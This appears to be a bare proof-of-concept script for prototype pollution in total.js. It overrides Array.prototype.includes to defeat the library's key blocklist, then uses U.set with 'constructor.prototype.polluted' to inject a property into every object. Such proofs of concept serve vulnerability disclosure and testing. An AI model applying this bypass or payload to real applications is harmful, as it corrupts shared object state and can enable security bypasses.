Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const total = require('total.js');
obj = {};
console.log({}.polluted);
U.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);